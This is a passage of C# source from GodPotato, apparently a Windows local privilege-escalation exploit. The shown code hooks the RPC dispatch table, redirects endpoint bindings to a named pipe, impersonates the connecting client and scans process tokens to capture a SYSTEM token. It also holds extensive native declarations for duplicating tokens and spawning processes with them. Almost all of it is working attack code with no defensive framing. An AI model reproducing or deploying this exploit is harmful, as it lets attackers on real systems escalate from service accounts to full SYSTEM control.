NativeMethods.PIPE_ACCESS_DUPLEX, NativeMethods.PIPE_TYPE_BYTE | NativeMethods.PIPE_READMODE_BYTE | NativeMethods.PIPE_WAIT, NativeMethods.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);\n\n                if (pipeServerHandle != NativeMethods.BAD_HANLE)\n                {\n                    bool isConnect = NativeMethods.ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);\n\n                    if ((isConnect || Marshal.GetLastWin32Error() == NativeMethods.ERROR_PIPE_CONNECTED) && IsStart)\n                    {\n                        if (NativeMethods.ImpersonateNamedPipeClient(pipeServerHandle))\n                        {\n                            systemIdentity = WindowsIdentity.GetCurrent();\n                            if (systemIdentity.ImpersonationLevel <= TokenImpersonationLevel.Identification)\n                            {\n                                NativeMethods.RevertToSelf();\n                            }\n\n                            bool isFindSystemToken = false;\n\n                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)\n                            {\n                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {\n                                    if (processToken.SID == \"S-1-5-18\" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)\n                                    {\n                                        systemIdentity = new WindowsIdentity(processToken.TokenHandle);\n                                        isFindSystemToken = true;\n                                        processToken.Close();\n                                        return false;\n                                    }\n                                    processToken.Close();\n                                    return true;\n                                });\n                            }\n\n                            NativeMethods.RevertToSelf();\n                        }\n                    }\n                }\n            }\n            catch (Exception e)\n            {\n                \n            }\n\n            if (pipeServerHandle != NativeMethods.BAD_HANLE)\n            {\n                NativeMethods.CloseHandle(pipeServerHandle);\n            }\n\n            return;\n        }\n\n        public void Start()\n        {\n            if (IsHook && !IsStart)\n            {\n                pipeServerThread = new Thread(PipeServer);\n                pipeServerThread.IsBackground = true;\n                pipeServerThread.Start();\n                IsStart = true;\n            }\n            else\n            {\n                throw new Exception(\"IsHook == false\");\n            }\n\n        }\n\n        public void HookRPC()\n        {\n            uint old;\n            NativeMethods.VirtualProtect(DispatchTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, out old);\n            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));\n            IsHook = true;\n        }\n        public void Restore()\n        {\n            if (IsHook && UseProtseqFunctionPtr != IntPtr.Zero)\n            {\n                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFunctionPtr);\n            }\n            else\n            {\n                throw new Exception(\"IsHook == false\");\n            }\n        }\n        public void Stop()\n        {\n            if (IsStart)\n            {\n                IsStart = false;\n                if (pipeServerThread.IsAlive)\n                {\n                    try\n                    {\n                        SharpToken.SECURITY_ATTRIBUTES securityAttributes = new SharpToken.SECURITY_ATTRIBUTES();\n                        IntPtr pipeClientHandle = NativeMethod.CreateFileW(serverPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);\n                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);\n                        stream.WriteByte(0xaa);\n                        stream.Flush();\n                        stream.Close();\n                    }\n                    catch (Exception e)\n                    {\n                        pipeServerThread.Interrupt();\n                        pipeServerThread.Abort();\n                    }\n                }\n            }\n            else\n            {\n                throw new Exception(\"IsStart == false\");\n            }\n        }\n\n        public WindowsIdentity GetToken()\n        {\n            return systemIdentity;\n        }\n\n    }\n\n    class NewOrcbRPC\n    {\n        private GodPotatoContext godPotatoContext;\n        public NewOrcbRPC(GodPotatoContext godPotatoContext)\n        {\n            this.godPotatoContext = godPotatoContext;\n        }\n        public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)\n        {\n            string[] endpoints = { godPotatoContext.clientPipe, \"ncacn_ip_tcp:fuck you !\" };\n\n            int entrieSize = 3;\n            for (int i = 0; i < endpoints.Length; i++)\n            {\n                entrieSize += endpoints[i].Length;\n                entrieSize++;\n            }\n\n            int memroySize = entrieSize * 2 + 10;\n\n            IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);\n\n            for (int i = 0; i < memroySize; i++)\n            {\n                Marshal.WriteByte(pdsaNewBindings, i, 0x00);\n            }\n\n            int offset = 0;\n\n            Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);\n            offset += 2;\n            Marshal.WriteInt16(pdsaNewBindings, offset, (short)(entrieSize - 2));\n            offset += 2;\n\n            for (int i = 0; i < endpoints.Length; i++)\n            {\n                string endpoint = endpoints[i];\n                for (int j = 0; j < endpoint.Length; j++)\n                {\n                    Marshal.WriteInt16(pdsaNewBindings, offset, (short)endpoint[j]);\n                    offset += 2;\n                }\n                offset += 2;\n            }\n            Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);\n\n            return 0;\n        }\n        public delegate int delegateFun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3);\n        public delegate int delegateFun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4);\n        public delegate int delegateFun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5);\n        public delegate int delegateFun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6);\n        public delegate int delegateFun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7);\n        public delegate int delegateFun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8);\n        public delegate int delegateFun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9);\n        public delegate int delegateFun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10);\n        public delegate int delegateFun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11);\n        public delegate int delegateFun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12);\n        public delegate int delegateFun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13);\n        public int fun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3)\n        {\n            return fun(p2, p3);\n        }\n        public int fun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4)\n        {\n            return fun(p3, p4);\n        }\n        public int fun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5)\n        {\n            return fun(p4, p5);\n        }\n        public int fun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6)\n        {\n            return fun(p5, p6);\n        }\n        public int fun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7)\n        {\n            return fun(p6, p7);\n        }\n        public int fun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8)\n        {\n            return fun(p7, p8);\n        }\n        public int fun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9)\n        {\n            return fun(p8, p9);\n        }\n        public int fun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10)\n        {\n            return fun(p9, p10);\n        }\n        public int fun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11)\n        {\n            return fun(p10, p11);\n        }\n        public int fun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12)\n        {\n            return fun(p11, p12);\n        }\n        public int fun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13)\n        {\n            return fun(p12, p13);\n        }\n\n\n    }\n    class Sunday\n    {\n        private static int ALPHA_BET = 512;\n\n        private static int[] ComputeOccurence(byte[] pattern)\n        {\n            int[] table = new int[ALPHA_BET];\n            for (char a = (char)0; a < (char)ALPHA_BET; a++)\n            {\n                table[a] = -1;\n            }\n\n            for (int i = 0; i < pattern.Length; i++)\n            {\n                byte a = pattern[i];\n                table[a] = i;\n            }\n            return table;\n        }\n\n        public static List<int> Search(byte[] text, byte[] pattern)\n        {\n            List<int> matchs = new List<int>();\n\n            int i = 0;\n            int[] table = ComputeOccurence(pattern);\n            while (i <= text.Length - pattern.Length)\n            {\n                int j = 0;\n                while (j < pattern.Length && text[i + j] == pattern[j])\n                {\n                    j++;\n                }\n                if (j == pattern.Length)\n                {\n                    matchs.Add(i);\n                }\n                i += pattern.Length;\n                if (i < text.Length)\n                {\n                    i -= table[text[i]];\n                }\n            }\n            return matchs;\n        }\n    }\n\n}\n\nnamespace SharpToken\n{\n\n    public enum IntegrityLevel : uint\n    {\n        Untrusted,\n        LowIntegrity = 0x00001000,\n        MediumIntegrity = 0x00002000,\n        MediumHighIntegrity = 0x100 + MediumIntegrity,\n        HighIntegrity = 0X00003000,\n        SystemIntegrity = 0x00004000,\n        ProtectedProcess = 0x00005000\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_ACCESS_TOKEN\n    {\n        public IntPtr Token;\n        public IntPtr Thread;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SECURITY_ATTRIBUTES\n    {\n        public int nLength;\n        public IntPtr pSecurityDescriptor;\n        public bool bInheritHandle;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct TOKEN_MANDATORY_LABEL\n    {\n\n        public SID_AND_ATTRIBUTES Label;\n\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct TOKEN_GROUPS\n    {\n        public uint GroupCount;\n\n        public SID_AND_ATTRIBUTES Groups;\n    }\n\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SID_AND_ATTRIBUTES\n    {\n        public IntPtr Sid;\n        public uint Attributes;\n    }\n\n\n    [Flags]\n    public enum ProcessCreateFlags : uint\n    {\n        DEBUG_PROCESS = 0x00000001,\n        DEBUG_ONLY_THIS_PROCESS = 0x00000002,\n        CREATE_SUSPENDED = 0x00000004,\n        DETACHED_PROCESS = 0x00000008,\n        CREATE_NEW_CONSOLE = 0x00000010,\n        NORMAL_PRIORITY_CLASS = 0x00000020,\n        IDLE_PRIORITY_CLASS = 0x00000040,\n        HIGH_PRIORITY_CLASS = 0x00000080,\n        REALTIME_PRIORITY_CLASS = 0x00000100,\n        CREATE_NEW_PROCESS_GROUP = 0x00000200,\n        CREATE_UNICODE_ENVIRONMENT = 0x00000400,\n        CREATE_SEPARATE_WOW_VDM = 0x00000800,\n        CREATE_SHARED_WOW_VDM = 0x00001000,\n        CREATE_FORCEDOS = 0x00002000,\n        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,\n        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,\n        INHERIT_PARENT_AFFINITY = 0x00010000,\n        INHERIT_CALLER_PRIORITY = 0x00020000,\n        CREATE_PROTECTED_PROCESS = 0x00040000,\n        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,\n        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,\n        PROCESS_MODE_BACKGROUND_END = 0x00200000,\n        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,\n        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,\n        CREATE_DEFAULT_ERROR_MODE = 0x04000000,\n        CREATE_NO_WINDOW = 0x08000000,\n        PROFILE_USER = 0x10000000,\n        PROFILE_KERNEL = 0x20000000,\n        PROFILE_SERVER = 0x40000000,\n        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,\n    }\n\n    public enum PROCESS_INFORMATION_CLASS\n    {\n        ProcessBasicInformation,\n        ProcessQuotaLimits,\n        ProcessIoCounters,\n        ProcessVmCounters,\n        ProcessTimes,\n        ProcessBasePriority,\n        ProcessRaisePriority,\n        ProcessDebugPort,\n        ProcessExceptionPort,\n        ProcessAccessToken,\n        ProcessLdtInformation,\n        ProcessLdtSize,\n        ProcessDefaultHardErrorMode,\n        ProcessIoPortHandlers,\n        ProcessPooledUsageAndLimits,\n        ProcessWorkingSetWatch,\n        ProcessUserModeIOPL,\n        ProcessEnableAlignmentFaultFixup,\n        ProcessPriorityClass,\n        ProcessWx86Information,\n        ProcessHandleCount,\n        ProcessAffinityMask,\n        ProcessPriorityBoost,\n        MaxProcessInfoClass\n\n\n    }\n\n    [Flags]\n    public enum ProcessAccessFlags : uint\n    {\n        All = 0x001F0FFF,\n        Terminate = 0x00000001,\n        CreateThread = 0x00000002,\n        VirtualMemoryOperation = 0x00000008,\n        VirtualMemoryRead = 0x00000010,\n        VirtualMemoryWrite = 0x00000020,\n        DuplicateHandle = 0x00000040,\n        CreateProcess = 0x000000080,\n        SetQuota = 0x00000100,\n        SetInformation = 0x00000200,\n        QueryInformation = 0x00000400,\n        QueryLimitedInformation = 0x00001000,\n        Synchronize = 0x00100000\n    }\n    public enum TOKEN_ELEVATION_TYPE\n    {\n        TokenElevationTypeDefault = 1,\n        TokenElevationTypeFull,\n        TokenElevationTypeLimited\n    }\n    public enum TOKEN_INFORMATION_CLASS\n    {\n        TokenUser = 1,\n        TokenGroups,\n        TokenPrivileges,\n        TokenOwner,\n        TokenPrimaryGroup,\n        TokenDefaultDacl,\n        TokenSource,\n        TokenType,\n        TokenImpersonationLevel,\n        TokenStatistics,\n        TokenRestrictedSids,\n        TokenSessionId,\n        TokenGroupsAndPrivileges,\n        TokenSessionReference,\n        TokenSandBoxInert,\n        TokenAuditPolicy,\n        TokenOrigin,\n        TokenElevationType,\n        TokenLinkedToken,\n        TokenElevation,\n        TokenHasRestrictions,\n        TokenAccessInformation,\n        TokenVirtualizationAllowed,\n        TokenVirtualizationEnabled,\n        TokenIntegrityLevel,\n        TokenUIAccess,\n        TokenMandatoryPolicy,\n        TokenLogonSid,\n        TokenIsAppContainer,\n        TokenCapabilities,\n        TokenAppContainerSid,\n        TokenAppContainerNumber,\n        TokenUserClaimAttributes,\n        TokenDeviceClaimAttributes,\n        TokenRestrictedUserClaimAttributes,\n        TokenRestrictedDeviceClaimAttributes,\n        TokenDeviceGroups,\n        TokenRestrictedDeviceGroups,\n        TokenSecurityAttributes,\n        TokenIsRestricted,\n        TokenProcessTrustLevel,\n        TokenPrivateNameSpace,\n        TokenSingletonAttributes,\n        TokenBnoIsolation,\n        TokenChildProcessFlags,\n        TokenIsLessPrivilegedAppContainer,\n        TokenIsSandboxed,\n        MaxTokenInfoClass\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct LUID\n    {\n        public int LowPart;\n\n        public int HighPart;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public class TokenPrivileges\n    {\n        public int PrivilegeCount = 1;\n\n        public LUID Luid;\n\n        public int Attributes;\n    }\n    public enum SECURITY_LOGON_TYPE : uint\n    {\n        UndefinedLogonType = 0,\n        Interactive = 2,\n        Network,\n        Batch,\n        Service,\n        Proxy,\n        Unlock,\n        NetworkCleartext,\n        NewCredentials,\n        RemoteInteractive,\n        CachedInteractive,\n        CachedRemoteInteractive,\n        CachedUnlock\n    }\n    public enum TOKEN_TYPE\n    {\n        UnKnown = -1,\n        TokenPrimary = 1,\n        TokenImpersonation\n    }\n    public enum OBJECT_INFORMATION_CLASS\n    {\n        ObjectBasicInformation,\n        ObjectNameInformation,\n        ObjectTypeInformation,\n        ObjectAllTypesInformation,\n        ObjectHandleInformation\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct OBJECT_TYPE_INFORMATION\n    { // Information Class 2\n        public UNICODE_STRING Name;\n        public int ObjectCount;\n        public int HandleCount;\n        public int Reserved1;\n        public int Reserved2;\n        public int Reserved3;\n        public int Reserved4;\n        public int PeakObjectCount;\n        public int PeakHandleCount;\n        public int Reserved5;\n        public int Reserved6;\n        public int Reserved7;\n        public int Reserved8;\n        public int InvalidAttributes;\n        public GENERIC_MAPPING GenericMapping;\n        public int ValidAccess;\n        public byte Unknown;\n        public byte MaintainHandleDatabase;\n        public int PoolType;\n        public int PagedPoolUsage;\n        public int NonPagedPoolUsage;\n    }\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct SECURITY_LOGON_SESSION_DATA\n    {\n        public uint Size;\n\n        public LUID LogonId;\n\n        public UNICODE_STRING UserName;\n\n        public UNICODE_STRING LogonDomain;\n\n        public UNICODE_STRING AuthenticationPackage;\n\n        public uint LogonType;\n\n        public uint Session;\n\n        public IntPtr Sid;\n\n        public long LogonTime;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct GENERIC_MAPPING\n    {\n        public int GenericRead;\n        public int GenericWrite;\n        public int GenericExecute;\n        public int GenericAll;\n    }\n    public class NativeMethod\n    {\n        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;\n        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;\n        public static readonly uint SystemExtendedHandleInformation = 0x40;\n        public static readonly uint STATUS_SUCCESS = 0x00000000;\n        public static readonly uint ERROR_SUCCESS = 0x00000000;\n        public static readonly uint STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;\n        public static readonly uint STATUS_BUFFER_OVERFLOW = 0x80000005;\n        public static readonly uint DUPLICATE_SAME_ACCESS = 0x00000002;\n        public static readonly uint MAXIMUM_ALLOWED = 0x02000000;\n        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;\n        public static uint TOKEN_ASSIGN_PRIMARY = 0x0001;\n        public static uint TOKEN_DUPLICATE = 0x0002;\n        public static uint TOKEN_IMPERSONATE = 0x0004;\n        public static uint TOKEN_QUERY = 0x0008;\n        public static uint TOKEN_QUERY_SOURCE = 0x0010;\n        public static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n        public static uint TOKEN_ADJUST_GROUPS = 0x0040;\n        public static uint TOKEN_ADJUST_DEFAULT = 0x0080;\n        public static uint TOKEN_ADJUST_SESSIONID = 0x0100;\n\n        public static uint STARTF_FORCEONFEEDBACK = 0x00000040;\n        public static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;\n        public static uint STARTF_PREVENTPINNING = 0x00002000;\n        public static uint STARTF_RUNFULLSCREEN = 0x00000020;\n        public static uint STARTF_TITLEISAPPID = 0x00001000;\n        public static uint STARTF_TITLEISLINKNAME = 0x00000800;\n        public static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;\n        public static uint STARTF_USECOUNTCHARS = 0x00000008;\n        public static uint STARTF_USEFILLATTRIBUTE = 0x00000010;\n        public static uint STARTF_USEHOTKEY = 0x00000200;\n        public static uint STARTF_USEPOSITION = 0x00000004;\n        public static uint STARTF_USESHOWWINDOW = 0x00000001;\n        public static uint STARTF_USESIZE = 0x00000002;\n        public static uint STARTF_USESTDHANDLES = 0x00000100;\n\n\n\n        public static uint GENERIC_READ = 0x80000000;\n        public static uint GENERIC_WRITE = 0x40000000;\n        public static uint GENERIC_EXECUTE = 0x20000000;\n        public static uint GENERIC_ALL = 0x10000000;\n\n\n\n\n\n        public static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;\n        public static uint TOKEN_ALL_ACCESS_P = STANDARD_RIGHTS_REQUIRED |\n                          TOKEN_ASSIGN_PRIMARY |\n                          TOKEN_DUPLICATE |\n                          TOKEN_IMPERSONATE |\n                          TOKEN_QUERY |\n                          TOKEN_QUERY_SOURCE |\n                          TOKEN_ADJUST_PRIVILEGES |\n                          TOKEN_ADJUST_GROUPS |\n                          TOKEN_ADJUST_DEFAULT;\n\n\n        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;\n        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;\n        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;\n\n        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);\n        public static readonly int NMPWAIT_NOWAIT = 0x00000001;\n        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;\n\n        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;\n\n        public static readonly int PIPE_WAIT = 0x00000000;\n        public static readonly int PIPE_NOWAIT = 0x00000001;\n        public static readonly int PIPE_READMODE_BYTE = 0x00000000;\n        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;\n        public static readonly int PIPE_TYPE_BYTE = 0x00000000;\n        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;\n        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;\n        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;\n\n        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;\n        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;\n        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;\n\n        public static IntPtr ContextToken = IntPtr.Zero;\n\n        public static IntPtr BAD_HANLE = new IntPtr(-1);\n\n        [DllImport(\"ntdll\")]\n        public static extern uint NtQuerySystemInformation(\n        [In] uint SystemInformationClass,\n        [In] IntPtr SystemInformation,\n        [In] uint SystemInformationLength,\n        [Out] out uint ReturnLength);\n        [DllImport(\"ntdll\")]\n        public static extern uint NtDuplicateObject(\n        [In] IntPtr SourceProcessHandle,\n        [In] IntPtr SourceHandle,\n        [In] IntPtr TargetProcessHandle,\n        [In] IntPtr PHANDLE,\n        [In] int DesiredAccess,\n        [In] int Attributes,\n        [In] int Options);\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtQueryObject(\n        [In] IntPtr Handle,\n        [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,\n        IntPtr ObjectInformation,\n        [In] int ObjectInformationLength,\n        out int ReturnLength);\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtSuspendProcess([In] IntPtr Handle);\n\n        [DllImport(\"ntdll.dll\", SetLastError = false)]\n        public static extern uint NtResumeProcess(IntPtr ProcessHandle);\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtTerminateProcess(\n  [In] IntPtr ProcessHandle,\n  [In] uint ExitStatus);\n\n\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtSetInformationProcess(\n\n  [In] IntPtr ProcessHandle,\n  [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,\n  [In] IntPtr ProcessInformation,\n  [In] uint ProcessInformationLength);\n\n        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]\n        [DllImport(\"secur32.dll\", SetLastError = true)]\n        internal static extern int LsaFreeReturnBuffer(IntPtr handle);\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern bool PeekNamedPipe(IntPtr handle,\n            byte[] buffer, uint nBufferSize, ref uint bytesRead,\n            ref uint bytesAvail, ref uint BytesLeftThisMessage);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool IsTokenRestricted(IntPtr TokenHandle);\n        [DllImport(\"kernel32\")]\n        public static extern void CloseHandle(IntPtr hObject);\n        [DllImport(\"kernel32\")]\n        public static extern IntPtr GetCurrentProcess();\n        [DllImport(\"kernel32\")]\n        public static extern void SetLastError(uint dwErrCode);\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]\n        public static extern bool CreateProcessW([In] string lpApplicationName, [In][Out] string lpCommandLine, [In] IntPtr lpProcessAttributes, [In] IntPtr lpThreadAttributes, [In] bool bInheritHandles, [In] uint dwCreationFlags, [In] IntPtr lpEnvironment, [In] string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, [Out] out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true, CharSet = CharSet.Unicode)]\n        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true, CharSet = CharSet.Unicode)]\n        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true)]\n        public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);\n        [DllImport(\"Kernel32\", SetLastError = true)]\n        public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);\n\n        [DllImport(\"wtsapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern int WTSGetActiveConsoleSessionId();\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern IntPtr OpenProcess(\n        ProcessAccessFlags processAccess, bool bInheritHandle, int processId);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern bool DuplicateHandle(\n  [In] IntPtr hSourceProcessHandle,\n  [In] IntPtr hSourceHandle,\n  [In] IntPtr hTargetProcessHandle,\n  out IntPtr lpTargetHandle,\n  [In] uint dwDesiredAccess,\n  [In] bool bInheritHandle,\n  [In] uint dwOptions\n);\n        [DllImport(\"secur32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        internal static extern uint LsaGetLogonSessionData([In] ref LUID LogonId, [In][Out] ref IntPtr ppLogonSessionData);\n        [DllImport(\"advapi32.dll\", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool LookupPrivilegeValue([MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, [MarshalAs(UnmanagedType.LPTStr)] string lpName, out LUID lpLuid);\n        [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, TokenPrivileges NewState, int BufferLength, IntPtr PreviousState, out int ReturnLength);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n        [DllImport(\"advapi32.dll\", SetLastError = true, EntryPoint = \"RevertToSelf\")]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool RevertToSelfEx();\n        [DllImport(\"kernel32.dll\", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = \"CreateNamedPipeW\", SetLastError = true)]\n        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);\n        [DllImport(\"kernel32.dll\", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = \"CreateFileW\", SetLastError = true)]\n        public static extern IntPtr CreateFileW(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, ref SECURITY_ATTRIBUTES secAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: 